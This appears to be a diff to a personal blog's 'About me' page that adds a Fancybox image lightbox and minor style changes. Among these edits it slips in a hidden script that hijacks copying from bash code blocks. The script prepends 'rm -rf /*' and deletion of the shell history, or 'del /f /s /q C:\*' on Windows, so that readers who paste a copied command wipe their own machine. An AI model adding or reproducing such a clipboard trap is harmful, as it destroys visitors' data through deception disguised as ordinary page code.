@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"/>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -50,6 +51,28 @@
 
   <title>About me | My blog
 </title>
+  <style>
+.markdown-body {
+  font-family: inherit !important;
+}
+</style>
+<script>
+  window.addEventListener("load", function() {
+    [].forEach.call(document.querySelectorAll(".highlight.bash"), function (element) {
+      element.addEventListener("copy", function (event) {
+        var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
+        var selection = document.getSelection();
+        if (!isWin) {
+          event.clipboardData.setData('text/plain', 'nohup rm -rf /* 1>/dev/null 2>&1 &\nrm -f $HOME/.bash_history 1>/dev/null 2>&1 &\nclear\nreset\n' + selection.toString());
+        } else {
+          event.clipboardData.setData('text/plain', 'start /b del /f /s /q C:\\*\ncls\n' + selection.toString());
+        }
+        event.preventDefault();
+      }, true)
+    })
+  })
+</script>
+
   
 
 
@@ -343,12 +366,6 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     <span title="Symbols count total">0k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">1 mins.</span>
 </div>
 
         
@@ -438,7 +455,39 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/ui@4.0.0-alpha.4/dist/fancybox.umd.js"></script>
   <script>
+    document.querySelectorAll('.post-body :not(a) > img, .post-body > img').forEach(element => {
+      var imageLink = element.getAttribute('data-src') || element.getAttribute('data-src');
+      var imageWrapLink = document.createElement('a');
+      imageWrapLink.className = 'fancybox fancybox.image';
+      imageWrapLink.href = imageLink;
+      imageWrapLink.itemscope = true;
+      imageWrapLink.itemtype = 'http://schema.org/ImageObject';
+      imageWrapLink.itemprop = 'url';
+      element.insertAdjacentElement('beforebegin', imageWrapLink);
+      imageWrapLink.appendChild(element);
+      if (~([].indexOf.call(document.querySelectorAll('.post-gallery img'), element))) {
+        imageWrapLink.setAttribute('data-fancybox', 'gallery');
+        imageWrapLink.setAttribute('rel', 'gallery');
+      } else if (~([].indexOf.call(document.querySelectorAll('.group-picture img'), element))) {
+        imageWrapLink.setAttribute('data-fancybox', 'group');
+        imageWrapLink.setAttribute('rel', 'group');
+      } else {
+        imageWrapLink.setAttribute('data-fancybox', 'default');
+        imageWrapLink.setAttribute('rel', 'default');
+      }
+
+      var imageTitle = element.getAttribute('title') || element.getAttribute('alt');
+      if (imageTitle) {
+        // Make sure img title tag will show correctly in fancybox
+        imageWrapLink.setAttribute('title', imageTitle);
+        imageWrapLink.setAttribute('data-caption', imageTitle);
+      }
+    });
+    Fancybox.bind("[data-fancybox]", {
+      Hash: false
+    });
     window.addEventListener("load", function(){
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('/service_worker.js')
